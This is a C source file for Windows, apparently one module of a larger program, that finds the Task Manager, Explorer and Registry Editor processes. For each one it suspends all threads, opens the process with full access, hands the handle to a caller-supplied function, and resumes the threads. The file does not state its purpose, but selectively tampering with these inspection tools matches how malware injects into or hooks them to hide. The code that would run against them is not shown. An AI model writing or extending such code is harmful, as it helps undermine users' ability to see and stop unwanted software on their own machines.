#include "stdafx.h"
#include "process.h"
#include "utils.h"

// GLOBALS
DWORD dwGKPID;

BOOL process_allSuspendApplyResume(APPLY aFunc) {
    HANDLE hSnapP;
    PROCESSENTRY32 pe32;

    if (INVALID_HANDLE_VALUE == (hSnapP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)))
        return FALSE;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (FALSE == Process32First(hSnapP, &pe32)) {
        if (ERROR_NO_MORE_FILES == GetLastError()) // No process running apparently
            return TRUE;
        return FALSE;
    }

    dwGKPID = GetCurrentProcessId();
    while (TRUE) {
		DWORD dwPID = pe32.th32ProcessID;
		if (dwGKPID != dwPID && dwPID != 0) { // Lets not suspend ourself
			if (stricmp(pe32.szExeFile, "taskmgr.exe") == 0
				|| stricmp(pe32.szExeFile, "explorer.exe") == 0
				|| stricmp(pe32.szExeFile, "regedit.exe") == 0) {
				if (TRUE == process_suspendOrResumeAllThreads(dwPID, TRUE)) {
					HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

					if (NULL != hP) {
						if (NULL != aFunc) // For debugging purpose only TODO remove
							aFunc(hP);
						CloseHandle(hP);
						process_suspendOrResumeAllThreads(dwPID, FALSE);
					}
				}
			}
		}

		if (FALSE == (Process32Next(hSnapP, &pe32)))
			break;
	}

	return TRUE;
}

BOOL process_suspendOrResumeAllThreads(DWORD dwPID, BOOL bSuspend) {
	HANDLE hSnapT;
	HANDLE hT;
	THREADENTRY32 te32;

	if (INVALID_HANDLE_VALUE == (hSnapT = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)))
		return FALSE;

	te32.dwSize = sizeof(THREADENTRY32);
	if (FALSE == Thread32First(hSnapT, &te32)) {
		return TRUE;
	}

	while (TRUE) {
		if (dwPID == te32.th32OwnerProcessID) {
			if (NULL == (hT = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID))) {
				utils_debugOutputErrCode(GetLastError());
				return FALSE;
			}

			if (bSuspend) {
				if (-1 == SuspendThread(hT)) {
					utils_debugOutputErrCode(GetLastError());
					CloseHandle(hT);
					return FALSE;
				}
			}
			else {
				if (-1 == ResumeThread(hT)) {
					utils_debugOutputErrCode(GetLastError());
					CloseHandle(hT);
					return FALSE;
				}
			}

			CloseHandle(hT);
		}
		if (FALSE == (Thread32Next(hSnapT, &te32)))
			break;
	}

	return TRUE;
}